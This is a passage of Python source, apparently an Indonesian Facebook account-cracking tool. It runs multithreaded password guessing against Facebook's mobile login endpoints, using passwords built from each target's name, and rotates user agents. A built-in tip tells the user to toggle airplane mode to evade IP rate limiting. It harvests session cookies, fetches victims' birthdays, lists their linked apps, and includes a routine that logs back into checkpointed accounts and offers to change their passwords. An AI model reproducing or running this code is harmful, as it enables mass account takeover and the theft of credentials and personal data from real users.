			krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
			cetak(nel(krek, title='• Tips •'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('4', '04'):
			krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(waktu,waktu)
			cetak(nel(krek, title='• Hasil •'))
			krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
			cetak(nel(krek, title='• Tips •'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil2, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print("%s%s Isi yang benar kentod "%(M,til))
			self.langsung()
			
	# TOUCH
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		wib = random.choice([Lu,Hi, Wibu])
		for wk in list('\|-/'):
			sys.stdout.write('\r'+wk+' ['+user+'] %s/%s %sOK%s-%s%s%s %sCP%s-%s%s%s '%(loop,len(self.id),warna,warna,warna,len(ok),warna,warna,warna,warna,len(cp),warna)),
			sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[OK] %s • %s • %s %s %s • %s '%(H,user,pw,day,month,year,kukis))
						ok.append("%s • %s • %s %s %s • %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [OK] %s • %s • %s %s %s • %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[OK] %s • %s • %s '%(H,user,pw,kukis))
					ok.append('%s • %s • %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [OK] %s • %s • %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[CP] %s • %s • %s %s %s  '%(K,user,pw,day,month,year))
						cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[CP] %s • %s           '%(K,user,pw))
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	# MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		wib = random.choice([Lu,Hi, Wibu])
		for wk in list('\|-/'):
			sys.stdout.write('\r'+wk+' ['+user+'] %s/%s %sOK%s-%s%s%s %sCP%s-%s%s%s '%(loop,len(self.id),warna,warna,warna,len(ok),warna,warna,warna,warna,len(cp),warna)),
			sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
					print ('\r%s[OK] %s • %s • %s '%(H,user,pw,kukis))
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[CP] %s • %s • %s %s %s  '%(K,user,pw,day,month,year))
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[CP] %s • %s           '%(K,user,pw))
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	# MOBILE
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		wib = random.choice([Lu,Hi, Wibu])
		for wk in list('\|-/'):
			sys.stdout.write('\r'+wk+' ['+user+'] %s/%s %sOK%s-%s%s%s %sCP%s-%s%s%s '%(loop,len(self.id),warna,warna,warna,len(ok),warna,warna,warna,warna,len(cp),warna)),
			sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[OK] %s • %s • %s %s %s • %s '%(H,user,pw,day,month,year,kukis))
						ok.append("%s • %s • %s %s %s • %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [OK] %s • %s • %s %s %s • %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[OK] %s • %s • %s '%(H,user,pw,kukis))
					ok.append('%s • %s • %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [OK] %s • %s • %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[CP] %s • %s • %s %s %s  '%(K,user,pw,day,month,year))
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[CP] %s • %s           '%(K,user,pw))
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)
	def mobil2(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		wib = random.choice([Lu,Hi, Wibu])
		for wk in list('\|-/'):
			sys.stdout.write('\r'+wk+' ['+user+'] %s/%s %sOK%s-%s%s%s %sCP%s-%s%s%s '%(loop,len(self.id),warna,warna,warna,len(ok),warna,warna,warna,warna,len(cp),warna)),
			sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict().keys():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[OK] %s • %s • %s %s %s • %s '%(H,user,pw,day,month,year,kukis))
						ok.append("%s • %s • %s %s %s • %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" [OK] %s • %s • %s %s %s • %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[OK] %s • %s • %s '%(H,user,pw,kukis))
					ok.append('%s • %s • %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' [OK] %s • %s • %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in po.cookies.get_dict().keys():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[CP] %s • %s • %s %s %s  '%(K,user,pw,day,month,year))
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[CP] %s • %s           '%(K,user,pw))
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		tap = '# OK : %s CP : %s '%(str(len(ok),str(len(cp))))
		fx = mark(tap, style='• HASIL •')
		if len(cp)==0:
			exit()
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	print("\r╚══ INFORMASI GAME : ") 
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╚══ %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print("\r       ╚══ %s%s. %s%s"%(P,i+1,K,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

# CEKPOINT DETEKTOR
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
	for file in dirs:
		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
	try:
		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s• file tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s isi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• sandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
	os.popen('play-audio data/cek.mp3')
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	pilihan().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
